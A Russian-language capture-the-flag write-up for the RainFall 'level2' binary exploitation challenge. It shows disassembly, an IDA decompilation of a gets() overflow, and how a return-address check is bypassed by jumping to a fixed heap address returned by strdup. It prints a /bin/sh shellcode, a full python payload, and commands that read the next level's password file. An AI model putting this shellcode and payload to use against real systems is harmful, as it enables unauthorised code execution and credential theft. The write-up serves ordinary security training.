## HowTo

```
> su level2
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

### Инструменты:
- Ida Pro + hex rays
- peda (gdb + patterns)
- ltrace

**NB:** Для работы с файлом стягиваем его на локальную машину

### Анализ и ход решения

1. Анализируем `main`
```
> gdb ./level2
> disass main
   0x0804853f <+0>:	push   ebp
   0x08048540 <+1>:	mov    ebp,esp
   0x08048542 <+3>:	and    esp,0xfffffff0
   0x08048545 <+6>:	call   0x80484d4 <p>
   0x0804854a <+11>:	leave  
   0x0804854b <+12>:	ret  
```

- main вызывает функцию `p()` которая в си-представлении выглядит так (используем IdaPro)
```
char *p()
{
  char s; // [esp+1Ch] [ebp-4Ch]
  unsigned int v2; // [esp+5Ch] [ebp-Ch]
  unsigned int retaddr; // [esp+6Ch] [ebp+4h]

  fflush(stdout);
  gets(&s);
  v2 = retaddr;
  if ( (retaddr & 0xB0000000) == -1342177280 )
  {
    printf("(%p)\n", v2);
    _exit(1);
  }
  puts(&s);
  return strdup(&s);
```

- вызывается `gets`, доступная для переполнения 
- проверяется, что адрес возврата не находится на стеке (проверка, что мы не подменили адрес возврата). Эта защита предотвращает попадает `shell code` на стек.

2. **Идея взлома** - попробуем исползовать кучу, вместо стека
```
> disass p
...
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
...
```

3. У нас есть вызов `strdup`, который, как известно, использует `malloc`, с помощью которого выделяет память на куче. 
Нам нужно найти адрес, который возвращает маллок

```
> level2@RainFall:~$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff6f4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                              = 0
gets(0xbffff5fc, 0, 0, 0xb7e5ec73, 0x80482b5
)                    = 0xbffff5fc
puts(""
)                                                               = 1
strdup("")                                                      = 0x0804a008
+++ exited (status 8) +++
```

- Мы видим, что при разном `input`, `malloc` всегда возвращает один и тот же адрес - `0x0804a008`

4. Нам нужно поместить `shell code` в нужным нам адрес на куче и затем подменить адрес возврата на нужным нам адрес на куче 
5. Находим `shell code` (используем базу shell-storm) http://shell-storm.org/shellcode/files/shellcode-575.php
```
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```

6. Находим смещение для переписывания адреса, записанного в `eip` (instruction pointer)
```
> gdb ./level2
> pattern create 100
> run < <(echo 'pattern')
...
> patts
Registers contain pattern buffer:
EIP+0 found at offset: 80
```
7. Готовим пейлоад для запуска
- размер `shell code`  - `21` байт
- `59` байта случайных данных (добиваем до оффсета `80`)
- `4` байта в конце - возвращаемый адрес

Откуда берем возвращаемый адрес: помним, что `malloc` возвращает `0x0804a008`
```
> python
> 0x0804a008.to_bytes(4, 'little')
b'\x08\xa0\x04\x08'
```
Итоговый payload
```
python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "a" * 59 + "\x08\xa0\x04\x08"' > /tmp/payload2
```

8. Запуск
```
> cat /tmp/payload2 - | ./level2
...
> whoami
... level3
> cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```